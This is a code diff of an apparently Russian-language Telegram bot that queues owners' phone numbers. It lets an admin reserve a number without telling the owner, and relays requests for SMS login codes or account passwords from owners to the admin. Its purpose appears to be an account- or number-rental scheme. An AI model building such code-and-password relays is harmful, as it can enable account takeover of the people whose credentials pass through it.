@@ -70,8 +70,9 @@ _timer_task:          asyncio.Task | None = None
 _reward_task:         asyncio.Task | None = None
 _admin_ctrl_msg_id:   int | None          = None   # ID сообщения-панели у админа
 _admin_ctrl_chat_id:  int | None          = None
-_password_mode:       bool                = False  # ожидаем код от владельца
+_password_mode:       bool                = False  # ожидаем код/пароль от владельца
 _password_attempts:   int                 = 0      # оставшихся попыток «Повтор»
+_request_kind:        str                 = "code" # "code" или "password"
 
 
 class ThrottleMiddleware(BaseMiddleware):
@@ -828,6 +829,54 @@ async def _activate_request(bot: Bot, req: CodeRequest) -> bool:
     return True
 
 
+async def _admin_take_phone(
+    bot: Bot, admin_id: int, phone: str,
+    msg: Message | InaccessibleMessage | None,
+) -> None:
+    """Резервируем номер для ручной обработки — владелец НЕ уведомляется.
+    Уведомление отправляется только при нажатии «Код» или «Пароль»."""
+    global _admin_ctrl_msg_id, _admin_ctrl_chat_id, _password_mode, _password_attempts
+
+    owner = store.owner_by_phone(phone)
+    if not owner:
+        await _edit_or_answer(msg, f"❌ Номер {phone} не найден.", reply_markup=admin_menu_inline())
+        return
+
+    status = store.phone_status(phone)
+    if status == "banned":
+        await _edit_or_answer(msg, f"🚫 {mask_phone(phone)} заблокирован.",
+                              reply_markup=owners_request_inline())
+        return
+    if status in ("active", "queued"):
+        await _edit_or_answer(msg, f"⏳ {mask_phone(phone)} уже в обработке.",
+                              reply_markup=owners_request_inline())
+        return
+    if status == "cooldown":
+        await _edit_or_answer(msg, f"🕐 {mask_phone(phone)} на кулдауне до завтра.",
+                              reply_markup=owners_request_inline())
+        return
+    if store.active:
+        await _edit_or_answer(msg,
+                              "⚠️ Уже есть активный номер — завершите его сначала.",
+                              reply_markup=admin_menu_inline())
+        return
+
+    req = CodeRequest(owner_id=owner.user_id, admin_id=admin_id, phone=phone)
+    store.set_active(req, timeout_sec=30 * 60)  # держим слот 30 мин без таймера
+    _password_mode     = False
+    _password_attempts = 0
+
+    sent = await _edit_or_answer(
+        msg,
+        f"📱 *{mask_phone(phone)}* — номер взят\n\nВыберите действие:",
+        parse_mode="Markdown",
+        reply_markup=active_inline(),
+    )
+    if sent:
+        _admin_ctrl_msg_id  = sent.message_id
+        _admin_ctrl_chat_id = admin_id
+
+
 async def _process_next_in_queue(bot: Bot, admin_id: int) -> None:
     while True:
         nxt = store.pop_next()
@@ -1100,13 +1149,15 @@ async def cb_active(callback: CallbackQuery, bot: Bot) -> None:
         await _finish_active(bot, reason="met")
 
     elif action in ("code", "password"):
-        global _password_mode, _password_attempts
+        global _password_mode, _password_attempts, _request_kind
         _password_mode     = True
         _password_attempts = 1  # 1 Повтор = 2 попытки суммарно
-        kind  = action  # "code" или "password"
-        label = "🔢 SMS-код" if kind == "code" else "🔑 Пароль"
+        _request_kind      = action
+        label = "🔢 SMS-код" if action == "code" else "🔑 Пароль"
         await callback.answer(f"{label} — запрос отправлен")
-        await _request_from_owner(bot, req, attempt=1, kind=kind)
+        # Только сейчас запускаем таймер и уведомляем владельца
+        await _start_code_timer(bot, req)
+        await _request_from_owner(bot, req, attempt=1, kind=action)
         if isinstance(msg, Message):
             try:
                 await msg.edit_text(
@@ -1168,7 +1219,7 @@ async def cb_password(callback: CallbackQuery, bot: Bot) -> None:
             await _finish_active(bot, reason="skip")
             return
         await callback.answer("🔄 Повторный запрос отправлен")
-        await _request_from_owner(bot, req, attempt=2, kind="code")
+        await _request_from_owner(bot, req, attempt=2, kind=_request_kind)
         if isinstance(msg, Message):
             try:
                 await msg.edit_text(
@@ -1451,14 +1502,8 @@ async def cb_request_code(callback: CallbackQuery, bot: Bot) -> None:
     if not phone:
         await callback.answer("Некорректный номер", show_alert=True)
         return
-    ok = await _do_request(bot, callback.from_user.id, phone, None)
-    if not ok:
-        await callback.answer("Не удалось отправить запрос", show_alert=True)
-        return
     await callback.answer()
-    if callback.message:
-        await _edit_or_answer(callback.message, f"Запрос для {mask_phone(phone)} отправлен.",
-                              reply_markup=admin_menu_inline())
+    await _admin_take_phone(bot, callback.from_user.id, phone, callback.message)
 
 
 @router.callback_query(F.data.startswith("work:"))
